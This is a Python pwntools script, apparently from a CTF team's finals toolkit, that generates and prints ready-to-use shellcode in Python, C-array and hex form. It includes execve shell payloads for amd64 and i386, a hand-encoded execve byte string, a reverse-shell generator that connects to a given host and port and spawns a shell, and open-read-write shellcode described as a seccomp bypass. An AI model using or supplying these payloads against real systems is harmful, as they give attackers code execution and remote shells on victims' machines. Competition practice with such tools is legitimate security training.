#!/usr/bin/env python3
"""
InCTF 2026 Finals — Common Shellcodes
TEAM_UNFINDABLES (FIN-030)

Pre-built shellcodes for common architectures.
Usage: python3 shellcode_gen.py [arch] [type]
"""
from pwn import *
import sys

def get_shellcode(arch="amd64", shell_type="execve"):
    """Generate common shellcodes."""

    shellcodes = {
        "amd64": {
            "execve": asm(shellcraft.amd64.linux.sh(), arch='amd64'),
            "execve_short": b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05',
            "reverse_shell": lambda host, port: asm(
                shellcraft.amd64.linux.connect(host, port) +
                shellcraft.amd64.linux.dupsh('rbp'),
                arch='amd64'
            ),
            "read_flag": asm(
                shellcraft.amd64.linux.cat('/flag') +
                shellcraft.amd64.linux.exit(0),
                arch='amd64'
            ),
            "orw": asm(  # Open-Read-Write (for seccomp bypass)
                shellcraft.amd64.linux.open('/flag') +
                shellcraft.amd64.linux.read('rax', 'rsp', 100) +
                shellcraft.amd64.linux.write(1, 'rsp', 100),
                arch='amd64'
            ),
        },
        "i386": {
            "execve": asm(shellcraft.i386.linux.sh(), arch='i386'),
            "read_flag": asm(
                shellcraft.i386.linux.cat('/flag'),
                arch='i386'
            ),
        },
    }

    if arch not in shellcodes:
        log.error(f"Unknown arch: {arch}. Available: {list(shellcodes.keys())}")
        return None

    if shell_type not in shellcodes[arch]:
        log.error(f"Unknown type: {shell_type}. Available: {list(shellcodes[arch].keys())}")
        return None

    return shellcodes[arch][shell_type]


def print_shellcode(sc, name="shellcode"):
    """Pretty print shellcode in multiple formats."""
    print(f"\n{'='*60}")
    print(f"  {name} ({len(sc)} bytes)")
    print(f"{'='*60}")

    # Python bytes
    print(f"\n[Python]")
    print(f"sc = {sc}")

    # C array
    print(f"\n[C array]")
    c_arr = ', '.join(f'0x{b:02x}' for b in sc)
    print(f'unsigned char sc[] = {{{c_arr}}};')

    # Hex string
    print(f"\n[Hex]")
    print(sc.hex())

    # Length
    print(f"\n[Length] {len(sc)} bytes")

    # Null bytes check
    if b'\x00' in sc:
        log.warning("Contains null bytes!")
        positions = [i for i, b in enumerate(sc) if b == 0]
        log.warning(f"Null byte positions: {positions}")
    else:
        log.success("No null bytes ✓")

    # Newline check
    if b'\n' in sc:
        log.warning("Contains newline (0x0a)!")
    else:
        log.success("No newlines ✓")


if __name__ == "__main__":
    arch = sys.argv[1] if len(sys.argv) > 1 else "amd64"
    shell_type = sys.argv[2] if len(sys.argv) > 2 else "execve"

    if shell_type == "list":
        print("Available shellcodes:")
        print(f"  amd64: execve, execve_short, read_flag, orw")
        print(f"  i386:  execve, read_flag")
        sys.exit(0)

    sc = get_shellcode(arch, shell_type)
    if sc:
        print_shellcode(sc, f"{arch}/{shell_type}")
